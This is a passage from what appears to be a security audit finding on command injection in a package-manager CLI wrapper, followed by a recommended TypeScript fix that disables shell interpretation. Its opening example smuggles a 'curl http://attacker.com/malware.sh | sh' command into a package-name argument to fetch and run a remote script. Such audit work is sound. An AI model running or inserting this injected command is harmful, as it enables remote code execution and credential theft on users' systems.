Executed: node kpm-cli.js install "package; curl http://attacker.com/malware.sh | sh"
Result: Malware installation, credential theft
```

**Impact**: Complete compromise of package management system.

**Recommended Fix**:
```typescript
private async executeCommand(args: string[]): Promise<string> {
  const { stdout, stderr } = await execAsync('node', [this.kpmBinary, ...args], {
    timeout: this.timeout,
    shell: false  // Disable shell interpretation
  });
  if (stderr) throw new Error(stderr);
  return stdout;
}

// Caller:
await this.executeCommand(['search', query, '--limit', String(limit)]);
```

